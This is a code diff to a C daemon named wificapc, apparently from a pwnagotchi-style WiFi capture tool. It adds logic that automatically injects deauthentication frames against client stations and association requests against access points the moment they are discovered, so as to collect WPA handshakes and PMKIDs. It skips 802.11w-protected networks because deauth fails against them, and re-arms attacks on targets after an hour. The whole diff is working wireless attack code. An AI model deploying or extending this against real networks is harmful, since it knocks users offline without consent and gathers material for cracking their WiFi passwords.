@@ -27,7 +27,7 @@
 
 #define DEFAULT_SOCK     "/run/wificapc.sock"
 #define DEFAULT_HS_DIR   "/etc/pwnagotchi/handshakes"
-#define WIFICAPC_VER     "0.8.5"
+#define WIFICAPC_VER     "0.8.6"
 
 #define DEFAULT_AP_TTL_SEC      120
 #define DEFAULT_STA_TTL_SEC     300
@@ -555,6 +555,32 @@ static int emit_attack_event(struct app *a, const char *tag,
 	return ipc_broadcast_event(a->ipc, IPC_EVT_ATTACK, buf, pos);
 }
 
+/* C-lite: fire one attack the instant a new target is discovered, instead of
+ * waiting for the next chanhop dwell. The beacon/frame that created the entry
+ * just arrived on the channel we're tuned to, so the NIC is already on the
+ * right channel. We inject silently (no attack.* event) — attack_on_channel
+ * still emits the representative UI events per dwell, and table bookkeeping
+ * (cooldown + attempt cap) throttles the periodic path so we don't double-hit. */
+static void attack_new_ap(struct app *a, const struct ap_record *ap)
+{
+	if (!a->auto_mode || !a->attack_enabled || ap->captured) return;
+	if (ensure_inject(a) < 0) return;
+	const char *ssid = ap->ssid_len ? ap->ssid : NULL;
+	inject_assoc(a->inject, ap->bssid, ssid, ap->ssid_len);
+	table_note_ap_attacked(a->table, ap->bssid, time(NULL));
+}
+
+static void attack_new_sta(struct app *a, const struct sta_record *sta)
+{
+	if (!a->auto_mode || !a->attack_enabled || a->pmkid_only) return;
+	if (!sta->have_ap) return;
+	if (table_ap_is_captured(a->table, sta->ap_bssid)) return;
+	if (table_ap_mfp_required(a->table, sta->ap_bssid)) return;   /* B */
+	if (ensure_inject(a) < 0) return;
+	inject_deauth(a->inject, sta->ap_bssid, sta->mac, 2, 7);
+	table_note_sta_attacked(a->table, sta->mac, time(NULL));
+}
+
 static void on_table_event(enum table_event evt,
                            const struct ap_record  *ap,
                            const struct sta_record *sta,
@@ -562,9 +588,15 @@ static void on_table_event(enum table_event evt,
 {
 	struct app *a = user;
 	switch (evt) {
-	case TABLE_EVT_AP_NEW:   emit_ap_event (a, "ap.new",   ap);  break;
+	case TABLE_EVT_AP_NEW:
+		emit_ap_event(a, "ap.new", ap);
+		attack_new_ap(a, ap);
+		break;
 	case TABLE_EVT_AP_LOST:  emit_ap_event (a, "ap.lost",  ap);  break;
-	case TABLE_EVT_STA_NEW:  emit_sta_event(a, "sta.new",  sta); break;
+	case TABLE_EVT_STA_NEW:
+		emit_sta_event(a, "sta.new", sta);
+		attack_new_sta(a, sta);
+		break;
 	case TABLE_EVT_STA_LOST: emit_sta_event(a, "sta.lost", sta); break;
 	}
 }
@@ -916,7 +948,9 @@ static void attack_on_channel(struct app *a, int channel)
 	for (int i = 0; i < n_aps && assoc_sent < ATTACK_PER_TICK; i++) {
 		if (aps[i].channel != channel) continue;    /* on-channel only */
 		if (aps[i].captured) continue;
-		if (aps[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+		if (aps[i].attack_count >= ATTACK_MAX_ATTEMPTS &&    /* D: give up, but */
+		    now - aps[i].last_attack < TABLE_ATTACK_REPLENISH_SEC)  /* re-arm after 1h */
+			continue;
 		if (aps[i].last_attack && now - aps[i].last_attack < ATTACK_COOLDOWN_SEC)
 			continue;
 		const char *ssid = aps[i].ssid_len ? aps[i].ssid : NULL;
@@ -935,7 +969,12 @@ static void attack_on_channel(struct app *a, int channel)
 			if (stas[i].channel != channel) continue;   /* on-channel only */
 			if (!stas[i].have_ap) continue;
 			if (table_ap_is_captured(a->table, stas[i].ap_bssid)) continue;
-			if (stas[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+			/* B: 802.11w APs protect mgmt frames — deauth is ignored, so
+			 * don't waste it (we still elicit their PMKID via assoc above). */
+			if (table_ap_mfp_required(a->table, stas[i].ap_bssid)) continue;
+			if (stas[i].attack_count >= ATTACK_MAX_ATTEMPTS &&      /* D */
+			    now - stas[i].last_attack < TABLE_ATTACK_REPLENISH_SEC)
+				continue;
 			if (stas[i].last_attack && now - stas[i].last_attack < ATTACK_COOLDOWN_SEC)
 				continue;
 			inject_deauth(a->inject, stas[i].ap_bssid, stas[i].mac, 2, 7);
